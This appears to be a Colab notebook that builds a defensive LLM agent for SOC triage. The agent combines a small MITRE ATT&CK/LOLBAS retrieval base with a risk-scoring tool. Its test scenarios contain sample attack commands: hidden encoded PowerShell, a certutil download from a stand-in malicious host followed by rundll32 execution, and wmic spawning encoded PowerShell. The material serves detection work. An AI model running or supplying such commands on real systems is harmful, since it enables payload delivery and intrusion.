# -*- coding: utf-8 -*-
"""ReAct.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1DvcmTSfa97tH_jlxKfKuVkz39NSS-j3t
"""

!pip install groq

import re
import math
import json
from collections import Counter
from google.colab import userdata
from groq import Groq

groq_api_key = userdata.get("GROQ_API_KEY")
client = Groq(api_key=groq_api_key)

class SimpleRAG:
    def __init__(self):
        self.vector_store = []

    def get_embedding(self, text):
        words = re.findall(r'\w+', text.lower())
        unigrams = Counter(words)
        bigrams = Counter([f"{words[i]}_{words[i+1]}" for i in range(len(words)-1)])
        unigrams.update(bigrams)
        return unigrams

    def _cosine_similarity(self, v1, v2):
        intersection = set(v1.keys()) & set(v2.keys())
        numerator = sum(v1[x] * v2[x] for x in intersection)
        denom = math.sqrt(sum(v1[x]**2 for x in v1)) * math.sqrt(sum(v2[x]**2 for x in v2))
        return numerator / denom if denom else 0.0

    def ingest(self, text):
        chunks = [c.strip() + "." for c in text.split(".") if c.strip()]
        for c in chunks:
            self.vector_store.append({
                "content": c,
                "vector": self.get_embedding(c)
            })

    def retrieve(self, query, top_k=3):
        q_vec = self.get_embedding(query)
        scored = []
        for item in self.vector_store:
            score = self._cosine_similarity(q_vec, item["vector"])
            scored.append((score, item["content"]))
        scored.sort(reverse=True)

        results = []
        for score, content in scored[:top_k]:
            if score > 0:
                results.append(f"[Score: {score:.3f}] {content}")

        return "\n".join(results) if results else "No relevant information found."

rag_engine = SimpleRAG()
mitre_lolbas_data = """
PowerShell with -encodedcommand or -enc flag is associated with MITRE ATT&CK T1059.001 (Command and Scripting Interpreter: PowerShell). This technique is commonly used by malware loaders and C2 beacons to execute obfuscated payloads.
The -nop (NoProfile) and -w hidden (WindowStyle Hidden) flags indicate defense evasion techniques under MITRE T1564.003 (Hidden Window). These flags prevent PowerShell from loading user profiles and hide the console window to avoid detection.
certutil.exe can download remote payloads using -urlcache -split -f flags and decode Base64 content. This is categorized under MITRE T1105 (Ingress Tool Transfer) and is listed in LOLBAS as a Living Off The Land binary for data exfiltration and payload delivery.
mshta.exe executes remote HTA scripts and VBScript/JScript code, commonly used for initial access. MITRE T1218.005 (System Binary Proxy Execution: Mshta). LOLBAS documents its abuse for command execution and fileless malware delivery.
rundll32.exe can execute arbitrary DLLs and JavaScript/VBScript code through COM objects. MITRE T1218.011 (System Binary Proxy Execution: Rundll32). Commonly abused by malware to load malicious DLLs without dropping executables.
regsvr32.exe can execute remote scriptlets (.sct files) and is used for application whitelisting bypass. MITRE T1218.010 (System Binary Proxy Execution: Regsvr32). Also known as "Squiblydoo" attack technique.
wmic.exe can execute commands locally or remotely and is used for lateral movement. MITRE T1047 (Windows Management Instrumentation). Can be used to create processes, query system information, and execute scripts.
schtasks.exe is used for persistence through scheduled task creation. MITRE T1053.005 (Scheduled Task/Job: Scheduled Task). Attackers use this to maintain access by creating tasks that execute malicious payloads at system startup or specific intervals.
Base64 encoded commands in PowerShell often indicate obfuscation attempts to evade signature-based detection. The decoded content typically reveals malicious scripts, download cradles, or shellcode injection techniques.
Invoke-WebRequest and Invoke-RestMethod cmdlets in PowerShell are used for downloading payloads from remote servers. These align with MITRE T1105 and are common in initial infection stages.
COM objects accessed through PowerShell (New-Object -ComObject) can be used for fileless malware execution and data exfiltration. This technique bypasses traditional file-based detection.
The combination of encoded commands with network activity (Invoke-WebRequest, Net.WebClient) typically indicates a multi-stage attack where the initial dropper downloads additional payloads.
Process injection techniques like Invoke-ReflectivePEInjection are categorized under MITRE T1055 (Process Injection). These techniques inject malicious code into legitimate processes to evade detection.
bitsadmin.exe can be used for downloading files in the background. MITRE T1197 (BITS Jobs). This technique is stealthier than direct web requests and can persist across reboots.
sc.exe (Service Control) can create, modify, or delete Windows services for persistence. MITRE T1543.003 (Create or Modify System Process: Windows Service).
"""
rag_engine.ingest(mitre_lolbas_data)

def command_intel(query: str) -> str:
    """
    Retrieve MITRE ATT&CK and LOLBAS context for a given command or technique.
    Returns ONLY raw reference information without analysis.
    Use this when you need technical context about commands, binaries, or attack techniques.
    """
    print(f"\n [RAG] Searching MITRE/LOLBAS knowledge base for: '{query}'")
    result = rag_engine.retrieve(query, top_k=3)
    if not result or result == "No relevant information found.":
        return "No MITRE or LOLBAS reference found for this query."
    return result

def calculate_risk_score(indicators: str) -> str:
    """
    Calculate risk score based on observed indicators.
    Input format: JSON string with keys: encoded_command, hidden_window, suspicious_binary, network_activity
    Example: {"encoded_command": true, "hidden_window": true, "suspicious_binary": "certutil", "network_activity": true}
    Returns risk score (0-100) and severity level.
    """
    print(f"\n [RISK CALCULATOR] Analyzing indicators: {indicators}")

    try:
        data = json.loads(indicators)
    except:
        return "Invalid JSON format. Please provide indicators in proper JSON format."

    score = 0
    reasons = []

    if data.get("encoded_command"):
        score += 30
        reasons.append("Encoded command detected (+30)")
    if data.get("hidden_window"):
        score += 20
        reasons.append("Hidden window flag (+20)")
    if data.get("suspicious_binary"):
        score += 25
        reasons.append(f"Suspicious binary: {data.get('suspicious_binary')} (+25)")
    if data.get("network_activity"):
        score += 25
        reasons.append("Network activity detected (+25)")

    severity = "LOW" if score < 30 else "MEDIUM" if score < 60 else "HIGH" if score < 80 else "CRITICAL"

    result = f"Risk Score: {score}/100 | Severity: {severity}\nFactors:\n" + "\n".join(f"- {r}" for r in reasons)
    return result

tools = [command_intel, calculate_risk_score]
tools_with_desc = "\n\n".join([
    f"**{t.__name__}**\n{t.__doc__.strip()}" for t in tools
])
known_actions = {t.__name__: t for t in tools}

system_prompt = f"""
You are an Advanced Cybersecurity specialized in malware analysis and threat hunting.
You operate in a reasoning loop:
Thought → Action → PAUSE → Observation → (repeat if needed) → Final Answer
CORE PRINCIPLES:

Always think step-by-step from a defensive SOC analyst perspective
Never make assumptions without consulting tools
For multi-stage attacks, analyze each component separately first, then correlate
Use tools strategically - don't call the same tool twice with the same query

AVAILABLE TOOLS:
{tools_with_desc}
WHEN TO USE command_intel:
✓ Unknown commands, binaries, or flags mentioned
✓ Need MITRE ATT&CK technique mapping
✓ Require LOLBAS reference for living-off-the-land binaries
✓ Obfuscated or encoded commands that need context
WHEN TO USE calculate_risk_score:
✓ After gathering all technical context
✓ When you need to quantify threat level
✓ Before providing final answer to help prioritize response
WHEN NOT TO USE TOOLS:
✗ General security concepts (privilege escalation, phishing, etc.)
✗ Already have sufficient context from previous observations
✗ Question is about SOC processes, not specific commands
MULTI-HOP ANALYSIS STRATEGY:
For complex queries involving multiple commands or log entries:

Identify all suspicious elements
Query command_intel for EACH unique element
Correlate observations to identify attack chains
Calculate overall risk score
Provide comprehensive answer with attack narrative

OUTPUT FORMAT:

Always start with "Thought:" to show your reasoning
Use "Action: tool_name: query" format (no brackets, no extra formatting)
After PAUSE, wait for "Observation:" from the system
Continue thinking or provide "Answer:" when ready

CRITICAL RULES:

Do NOT hallucinate MITRE technique IDs
Do NOT quote tool descriptions in your answer
Do NOT provide risk scores without using calculate_risk_score tool
Keep answers concise but technically precise

EXAMPLE FLOW:
Question: Is this command malicious?
powershell.exe -nop -w hidden -enc SQBFAFgA...
Thought: This PowerShell command has multiple suspicious flags. I need to understand what -nop, -w hidden, and -enc mean in a security context.
Action: command_intel: powershell -nop -w hidden -enc flags
PAUSE
Observation: [system provides MITRE context]
Thought: Now I have the technical context. Let me calculate the risk score to quantify the threat.
Action: calculate_risk_score: {{"encoded_command": true, "hidden_window": true, "suspicious_binary": "powershell", "network_activity": false}}
PAUSE
Observation: [system provides risk score]
Answer: This command is highly suspicious. The -enc flag indicates a Base64-encoded payload (MITRE T1059.001), while -nop and -w hidden are defense evasion techniques (MITRE T1564.003)...
""".strip()

class Agent:
    def __init__(self, system):
        self.messages = [{"role": "system", "content": system}]
        self.turn_count = 0

    def __call__(self, message):
        self.turn_count += 1
        self.messages.append({"role": "user", "content": message})
        result = self.execute()
        self.messages.append({"role": "assistant", "content": result})
        return result

    def execute(self):
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=self.messages,
            temperature=0,
            stop=["PAUSE", "Observation:", "<|"]
        )
        return response.choices[0].message.content

action_re = re.compile(r'^Action:\s*(\w+):\s*(.*)$', re.MULTILINE)

def query(question, max_turns=5):
    """
    Main orchestration function for ReAct agent.
    Now with enhanced trace logging for PDF requirements.
    """
    agent = Agent(system_prompt)
    next_prompt = question

    print(f"\n{'='*70}")
    print(f" QUESTION:")
    print(f"{'='*70}")
    print(f"{question}")
    print(f"{'='*70}\n")

    for turn in range(max_turns):
        print(f"\n{'─'*70}")
        print(f" TURN {turn + 1}/{max_turns}")
        print(f"{'─'*70}")

        result = agent(next_prompt)

        lines = result.split("\n")
        for line in lines:
            if line.strip().startswith("Thought:"):
                print(f"\n THOUGHT:\n   {line.strip()[9:]}")
            elif line.strip().startswith("Action:"):
                print(f"\n ACTION:\n   {line.strip()}")
            elif line.strip().startswith("Answer:"):
                print(f"\n FINAL ANSWER:\n   {line.strip()[8:]}")
            elif line.strip() and not line.strip().startswith("PAUSE"):
                print(f"   {line.strip()}")

        actions = [action_re.match(line) for line in result.split("\n")]
        actions = [a for a in actions if a]

        if actions:
            action, action_input = actions[0].groups()
            action_input = action_input.strip()

            if action not in known_actions:
                print(f"\n ERROR: Unknown action '{action}'")
                print(f"   Available actions: {list(known_actions.keys())}")
                raise Exception(f"Unknown action: {action}")

            print(f"\n EXECUTING TOOL: {action}")
            observation = known_actions[action](action_input)

            print(f"\n OBSERVATION:")
            for obs_line in observation.split("\n"):
                print(f"   {obs_line}")

            next_prompt = f"Observation: {observation}"
        else:
            print(f"\n{'='*70}")
            print(" AGENT COMPLETED - NO MORE ACTIONS REQUIRED")
            print(f"{'='*70}\n")
            return result

    print(f"\n WARNING: Max turns ({max_turns}) reached. Agent may not have completed analysis.\n")
    return result

print("=" * 70)
print("SCENARIO A: SINGLE-STEP QUERY (Doğrudan RAG sorgusu)")
print("=" * 70)
query("""
Analyze this command:
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA==
""")
print("\n\n")
print("=" * 70)
print("SCENARIO B: MULTI-HOP QUERY (Çok adımlı analiz)")
print("=" * 70)
query("""
Analyze this log sequence and determine if these commands are part of an attack chain:
10:23:45 powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
10:23:50 certutil.exe -urlcache -split -f http://malicious.com/payload.dll c:\temp\payload.dll
10:23:55 rundll32.exe c:\temp\payload.dll,EntryPoint
Are these related? What's the complete attack narrative?
""")
print("\n\n")
print("=" * 70)
print("SCENARIO C: RISK ASSESSMENT (Risk skorlama)")
print("=" * 70)
query("""
I found this suspicious activity in our logs:
wmic process call create "powershell.exe -enc JABXAGMAIAA9ACA..."
Should we escalate this to Incident Response? What's the risk level?
""")

